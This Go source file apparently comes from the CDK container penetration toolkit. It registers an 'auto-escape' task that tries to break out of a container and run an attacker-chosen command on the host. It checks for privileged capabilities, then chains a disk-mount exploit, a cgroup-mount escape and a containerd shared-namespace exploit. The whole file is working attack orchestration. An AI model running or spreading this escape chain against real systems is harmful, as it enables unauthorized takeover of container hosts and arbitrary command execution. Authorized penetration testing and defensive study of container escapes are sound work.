package task

import (
	"fmt"
	"github.com/cdk-team/CDK/pkg/cli"
	"github.com/cdk-team/CDK/pkg/evaluate"
	"github.com/cdk-team/CDK/pkg/exploit"
	"github.com/cdk-team/CDK/pkg/plugin"
	"log"
)

func autoEscape(shellCommand string) bool {

	success := false
	fmt.Printf("\n[Auto Escape - Privileged Container]\n")
	isPrivContainer := evaluate.GetProcCapabilities()
	if isPrivContainer {
		// try to write crontab after running device-mount exploit
		log.Println("starting to deploy exploit")
		err, mountedDirs := exploit.AllDiskMount()
		if err != nil {
			log.Println(err)
		} else {
			// TODO write to crontab
			fmt.Println(mountedDirs)
			success = true
		}

		// try to exec shell cmd via cgroup-mount exploit
		err = exploit.EscapeCgroup(shellCommand)
		if err != nil {
			log.Println(err)
		} else {
			log.Println("exploit success.")
			success = true
		}
	} else {
		log.Println("not privileged container.")
	}

	fmt.Printf("\n[Auto Escape - Shared Net Namespace]\n")
	err := exploit.ContainerdPwn(shellCommand, "", "")
	if err != nil {
		log.Println(err)
	} else {
		log.Println("exploit success.")
		success = true
	}

	return success
}

// task interface
type taskAutoEscapeS struct{}

func (p taskAutoEscapeS) Desc() string {
	return "Escape container in different ways then let target execute <cmd>."
}
func (p taskAutoEscapeS) Exec() bool {
	cmd := cli.Args["<cmd>"].(string)
	return autoEscape(cmd)
}

func init() {
	task := taskAutoEscapeS{}
	plugin.RegisterTask("auto-escape", task)
}
